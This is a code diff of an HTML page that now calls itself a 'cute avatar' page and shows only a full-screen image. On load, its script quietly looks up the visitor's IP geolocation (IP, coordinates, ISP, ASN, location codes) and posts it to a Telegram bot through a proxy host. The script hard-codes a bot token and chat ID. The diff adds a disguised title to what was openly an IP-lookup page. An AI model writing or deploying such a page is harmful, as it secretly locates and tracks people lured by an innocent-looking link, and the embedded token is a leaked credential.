@@ -2,19 +2,49 @@
 <html lang="zh-CN">
 	<head>
 		<meta charset="UTF-8">
-		<title>IP 地理位置信息</title>
+		<title>可爱头像</title>
 	</head>
 	<body>
-		<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg"
-			alt="杨明宇" style="width: 100%; height: 100%;">
+		<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg" alt="杨明宇"
+			style="width: 100%; height: auto;">
 
 		<script>
-			// 使用 JavaScript 发送请求到 API 并将响应信息推送到 Telegram
-			fetch('https://api.ip.sb/geoip')
-				.then(response => response.json())
-				.then(data => {
-					// 构建要推送到 Telegram 的消息
-					const message = `
+			const API_URL = 'https://api.ip.sb/geoip';
+			const TELEGRAM_API_URL = 'https://ymy.gay/https://api.telegram.org/bot'; // Replace with your Telegram Bot API URL
+			const TOKEN = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // Replace with your Telegram Bot API Token
+			const CHAT_ID = '5957163999'; // Replace with your Telegram Chat ID
+
+			async function fetchDataAndPush() {
+				try {
+					const data = await fetchIPData(API_URL);
+					if (data) {
+						const message = createMessage(data);
+						await pushToTelegram(message);
+					}
+				} catch (error) {
+					console.error('发生错误：', error);
+				}
+			}
+
+			async function fetchIPData(url) {
+				let attempts = 10; // 设置最大尝试次数
+				while (attempts > 0) {
+					try {
+						const response = await fetch(url);
+						if (response.ok) {
+							return await response.json();
+						}
+					} catch (error) {
+						console.error('获取 IP 数据时发生错误：', error);
+					}
+					attempts--;
+				}
+				console.error('无法获取 IP 数据');
+				return null;
+			}
+
+			function createMessage(data) {
+				return `
 IP 地址: ${data.ip}
 组织名称: ${data.organization}
 经度: ${data.longitude}
@@ -30,33 +60,34 @@ ASN 组织: ${data.asn_organization}
 大洲代码: ${data.continent_code}
 国家代码: ${data.country_code}
 区域代码: ${data.region_code}
-                `;
+            `;
+			}
 
-					// 将消息推送到 Telegram
-					const token = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的 Telegram Bot API 令牌
-					const chatId = '5957163999'; // 替换为您的 Telegram 聊天 ID
+			async function pushToTelegram(message) {
+				try {
+					const telegramResponse = await fetch(`${TELEGRAM_API_URL}${TOKEN}/sendMessage`, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json'
+						},
+						body: JSON.stringify({
+							chat_id: CHAT_ID,
+							text: message
+						})
+					});
 
-					fetch(`https://ymy.gay/https://api.telegram.org/bot${token}/sendMessage`, {
-							method: 'POST',
-							headers: {
-								'Content-Type': 'application/json'
-							},
-							body: JSON.stringify({
-								chat_id: chatId,
-								text: message
-							})
-						})
-						.then(response => response.json())
-						.then(responseData => {
-							console.log('消息已成功推送到 Telegram:', responseData);
-						})
-						.catch(error => {
-							console.error('推送到 Telegram 时发生错误：', error);
-						});
-				})
-				.catch(error => {
-					console.error('发生错误：', error);
-				});
+					const responseData = await telegramResponse.json();
+					if (responseData.ok) {
+						console.log('消息已成功推送到 Telegram:', responseData);
+					} else {
+						console.error('推送到 Telegram 失败:', responseData);
+					}
+				} catch (error) {
+					console.error('推送到 Telegram 时发生错误：', error);
+				}
+			}
+
+			fetchDataAndPush();
 		</script>
 	</body>
 </html>
